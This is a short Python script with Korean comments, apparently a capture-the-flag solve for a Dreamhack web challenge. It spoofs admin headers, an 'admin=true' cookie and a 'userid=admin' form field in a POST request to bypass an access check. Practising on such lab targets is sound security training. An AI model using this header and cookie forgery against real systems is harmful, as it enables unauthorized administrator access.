import requests

url = 'http://host3.dreamhack.games:9932/'  # 애플리케이션의 주소와 포트에 맞게 URL을 설정합니다.
headers = {'User-Agent': 'Admin Browser', 'DreamhackUser': 'admin'}  # 요청 헤더를 설정합니다.
cookies = {'admin': 'true'}  # 요청 쿠키를 설정합니다.
data = {'userid': 'admin'}  # 폼 데이터를 설정합니다.

response = requests.post(url, headers=headers, cookies=cookies, data=data)  # POST 요청을 보냅니다.

print(response.text)  # 서버에서 받은 응답을 출력합니다.
